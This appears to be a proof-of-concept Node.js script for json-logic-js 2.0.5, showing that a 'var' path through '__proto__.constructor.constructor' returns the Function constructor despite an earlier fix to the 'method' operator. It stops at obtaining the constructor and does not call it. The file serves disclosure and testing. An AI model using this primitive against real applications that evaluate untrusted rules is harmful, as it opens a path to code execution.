'use strict';
/**
 * json-logic-js 2.0.5 — var operator reaches Function constructor
 *
 *   npm i json-logic-js@2.0.5
 *   node poc.js
 *
 * Expected: control PASS, method_op PASS (historical fix), var_bypass HIT.
 */
const jsonLogic = require('json-logic-js');

const show = (id, v) => console.log(`[${id}]`, v);

// control
show('control', jsonLogic.apply({ var: 'user.role' }, { user: { role: 'user' } })); // "user"

// historical method-operator fix still holds
try {
  jsonLogic.apply({ method: [{ var: 'x' }, 'constructor'] }, { x: {} });
  show('method_op', 'MISS - operator still present');
} catch (e) {
  show('method_op', 'PASS - ' + e.message.slice(0, 40));
}

// read-side bypass
const F = jsonLogic.apply({ var: '__proto__.constructor.constructor' }, {});
show('var_bypass', typeof F === 'function' ? 'HIT - got Function' : 'MISS - ' + typeof F);

// NOTE: the library returns the constructor; it never invokes it.
